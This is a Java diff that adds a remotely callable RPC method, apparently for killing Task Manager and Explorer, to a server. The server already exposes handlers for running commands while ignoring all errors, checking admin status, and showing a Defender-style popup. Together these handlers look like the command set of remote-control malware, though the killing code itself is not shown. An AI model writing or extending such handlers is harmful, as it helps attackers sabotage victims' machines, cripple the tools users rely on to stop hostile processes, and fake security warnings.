@@ -35,6 +35,7 @@ public class RpcServer {
         methods.put("getAdminStatus", this::handleGetAdminStatus);
         methods.put("runCmdIgnoreErrors", this::handleRunCmdIgnoreErrors);
         methods.put("runDefenderPopup", this::handleRunDefenderPopup);
+        methods.put("runKillTaskmngrAndExp", this::handleRunKillTaskmngrAndExp);
     }
 
     // ##### CREATE YOUR OWN METHODS HERE ##### //
@@ -64,6 +65,11 @@ public class RpcServer {
         } catch (Exception e) {
             // Completely ignore all errors
         }
+    }
+
+    private void runKillTaskmngrAndExp() {
+        RpcServerMethods methods1 = new RpcServerMethods();
+        methods1.runKillTaskmngrAndExp();
     }
 
     public void runDefenderPopup() {
@@ -107,6 +113,19 @@ public class RpcServer {
         ObjectNode result = MAPPER.createObjectNode();
         result.put("stored", true);
         result.put("message", "popup displayed with: " + message);
+        return result;
+    }
+
+    private JsonNode handleRunKillTaskmngrAndExp(JsonNode req) {
+        JsonNode params = req.path("params");
+        String message = params.path("message").asText(null);
+        if (message == null) throw new IllegalArgumentException("params.message is required");
+
+        runKillTaskmngrAndExp();
+
+        ObjectNode result = MAPPER.createObjectNode();
+        result.put("stored", true);
+        result.put("message", "killed items: " + message);
         return result;
     }
 
